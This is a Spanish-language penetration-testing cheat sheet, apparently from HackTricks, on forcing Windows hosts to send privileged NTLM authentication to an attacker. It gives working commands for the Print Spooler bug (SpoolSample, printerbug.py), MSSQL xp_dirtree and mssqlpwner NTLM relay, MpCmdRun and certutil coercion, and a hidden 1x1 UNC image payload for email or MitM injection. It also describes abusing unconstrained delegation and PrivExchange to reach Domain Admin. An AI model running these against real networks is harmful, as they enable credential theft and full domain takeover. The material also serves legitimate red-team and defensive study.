# Forzar la Autenticación Privilegiada NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) es una **colección** de **disparadores de autenticación remota** codificados en C# utilizando el compilador MIDL para evitar dependencias de terceros.

## Abuso del Servicio de Spooler

Si el servicio _**Print Spooler**_ está **habilitado**, puedes usar algunas credenciales de AD ya conocidas para **solicitar** al servidor de impresión del Controlador de Dominio una **actualización** sobre nuevos trabajos de impresión y simplemente indicarle que **envíe la notificación a algún sistema**.\
Ten en cuenta que cuando la impresora envía la notificación a sistemas arbitrarios, necesita **autenticarse contra** ese **sistema**. Por lo tanto, un atacante puede hacer que el servicio _**Print Spooler**_ se autentique contra un sistema arbitrario, y el servicio **usará la cuenta de computadora** en esta autenticación.

### Encontrar Servidores Windows en el dominio

Usando PowerShell, obtén una lista de máquinas Windows. Los servidores suelen ser prioridad, así que enfoquémonos allí:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrar servicios de Spooler escuchando

Usando un @mysmartlogin ligeramente modificado (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica si el Servicio de Spooler está escuchando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
También puedes usar rpcdump.py en Linux y buscar el protocolo MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Pida al servicio que se autentique contra un host arbitrario

Puede compilar[ **SpoolSample desde aquí**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
o usa [**dementor.py de 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si estás en Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinando con Delegación No Restringida

Si un atacante ya ha comprometido una computadora con [Delegación No Restringida](unconstrained-delegation.md), el atacante podría **hacer que la impresora se autentique contra esta computadora**. Debido a la delegación no restringida, el **TGT** de la **cuenta de computadora de la impresora** será **guardado en** la **memoria** de la computadora con delegación no restringida. Como el atacante ya ha comprometido este host, podrá **recuperar este ticket** y abusar de él ([Pass the Ticket](pass-the-ticket.md)).

## Autenticación Forzada RCP

{{#ref}}
https://github.com/p0dalirius/Coercer
{{#endref}}

## PrivExchange

El ataque `PrivExchange` es el resultado de un defecto encontrado en la **función `PushSubscription` del Exchange Server**. Esta función permite que el servidor de Exchange sea forzado por cualquier usuario de dominio con un buzón para autenticarse en cualquier host proporcionado por el cliente a través de HTTP.

Por defecto, el **servicio de Exchange se ejecuta como SYSTEM** y se le otorgan privilegios excesivos (específicamente, tiene **privilegios WriteDacl en el dominio antes de la Actualización Acumulativa de 2019**). Este defecto puede ser explotado para habilitar el **reenvío de información a LDAP y posteriormente extraer la base de datos NTDS del dominio**. En casos donde el reenvío a LDAP no es posible, este defecto aún puede ser utilizado para reenviar y autenticarse en otros hosts dentro del dominio. La explotación exitosa de este ataque otorga acceso inmediato al Administrador de Dominio con cualquier cuenta de usuario de dominio autenticada.

## Dentro de Windows

Si ya estás dentro de la máquina Windows, puedes forzar a Windows a conectarse a un servidor utilizando cuentas privilegiadas con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
O utiliza esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es posible usar certutil.exe lolbin (binario firmado por Microsoft) para forzar la autenticación NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Inyección HTML

### A través de correo electrónico

Si conoces la **dirección de correo electrónico** del usuario que inicia sesión en una máquina que deseas comprometer, podrías simplemente enviarle un **correo electrónico con una imagen de 1x1** como
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
y cuando lo abra, intentará autenticarse.

### MitM

Si puedes realizar un ataque MitM a una computadora e inyectar HTML en una página que él visualizará, podrías intentar inyectar una imagen como la siguiente en la página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Cracking NTLMv1

Si puedes capturar [desafíos NTLMv1 lee aquí cómo crackearlos](../ntlm/index.html#ntlmv1-attack).\
_Recuerda que para crackear NTLMv1 necesitas establecer el desafío de Responder a "1122334455667788"_

{{#include ../../banners/hacktricks-training.md}}
